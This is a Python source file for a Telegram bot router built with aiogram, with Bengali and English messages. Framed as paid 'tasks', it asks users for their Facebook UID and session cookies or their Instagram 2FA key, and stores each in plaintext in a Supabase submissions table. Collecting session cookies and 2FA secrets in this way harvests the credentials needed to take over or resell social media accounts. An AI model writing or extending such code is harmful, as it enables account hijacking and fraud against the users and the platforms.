import logging
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from database import db
from keyboards import get_main_keyboard, get_cancel_keyboard

logger = logging.getLogger(__name__)
social_router = Router()

# সোশ্যাল টাস্কের জন্য আলাদা স্টেট
class SocialTaskStates(StatesGroup):
    waiting_for_fb_uid = State()
    waiting_for_fb_cookies = State()
    waiting_for_insta_2fa = State()

# --- ফেসবুক টাস্ক হ্যান্ডলার ---
@social_router.callback_query(F.data == "prompt_fb_uid")
async def handle_prompt_fb_uid(callback: CallbackQuery, state: FSMContext):
    await state.set_state(SocialTaskStates.waiting_for_fb_uid)
    await callback.message.answer("📘 <b>Enter your Facebook account 14-16 digit UID:</b>", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    await callback.answer()

@social_router.message(SocialTaskStates.waiting_for_fb_uid)
async def process_fb_uid(message: Message, state: FSMContext):
    uid_text = message.text.strip()
    if uid_text.isdigit() and 10 <= len(uid_text) <= 18:
        await state.update_data(fb_uid=uid_text)
        await state.set_state(SocialTaskStates.waiting_for_fb_cookies)
        await message.answer("🍪 <b>Now enter your Facebook account Cookies:</b>", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    else:
        await message.answer("⚠️ সঠিক 14-16 ডিজিটের Facebook UID প্রদান করুন।", reply_markup=get_cancel_keyboard())

@social_router.message(SocialTaskStates.waiting_for_fb_cookies)
async def process_fb_cookies(message: Message, state: FSMContext):
    cookies_text = message.text.strip()
    if len(cookies_text) > 10:
        data = await state.get_data()
        fb_uid = data.get("fb_uid")
        
        # Supabase-এ সাবমিশন সেভ করা
        try:
            db.supabase.table("user_submissions").insert({
                "user_id": message.from_user.id,
                "category": "facebook",
                "submission_data": f"UID: {fb_uid} | Cookies: {cookies_text}",
                "status": "pending"
            }).execute()
        except Exception as e:
            logger.error(f"Error saving FB submission: {e}")

        await state.clear()
        await message.answer("✅ <b>Facebook Task Submitted Successfully!</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
    else:
        await message.answer("⚠️ <b>Invalid Cookies!</b> সঠিক কুকিজ প্রদান করুন।", parse_mode="HTML", reply_markup=get_cancel_keyboard())

# --- ইনস্টাগ্রাম টাস্ক হ্যান্ডলার ---
@social_router.callback_query(F.data == "prompt_insta_2fa")
async def handle_prompt_insta_2fa(callback: CallbackQuery, state: FSMContext):
    await state.set_state(SocialTaskStates.waiting_for_insta_2fa)
    await callback.message.answer("🔑 <b>Enter 2FA Key:</b> ⤵️", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    await callback.answer()

@social_router.message(SocialTaskStates.waiting_for_insta_2fa)
async def process_insta_2fa(message: Message, state: FSMContext):
    key_text = message.text.strip()
    if len(key_text) >= 6:
        try:
            db.supabase.table("user_submissions").insert({
                "user_id": message.from_user.id,
                "category": "instagram",
                "submission_data": f"2FA Key: {key_text}",
                "status": "pending"
            }).execute()
        except Exception as e:
            logger.error(f"Error saving Insta submission: {e}")

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Account Created", callback_data="insta_created_confirm")]
        ])
        await message.answer("📱 অ্যাকাউন্ট খোলার পর নিচের বাটনে ক্লিক করুন:", reply_markup=kb, parse_mode="HTML")
        await state.clear()
    else:
        await message.answer("⚠️ সঠিক 2FA Key প্রদান করুন।", reply_markup=get_cancel_keyboard())

@social_router.callback_query(F.data == "insta_created_confirm")
async def handle_insta_confirm(callback: CallbackQuery):
    await callback.message.edit_text("⏳ <b>আপনার ইনস্টাগ্রাম টাস্ক সফলভাবে সাবমিট হয়েছে।</b>", parse_mode="HTML")
    await callback.message.answer("প্রধান মেনু:", reply_markup=get_main_keyboard())
    await callback.answer()
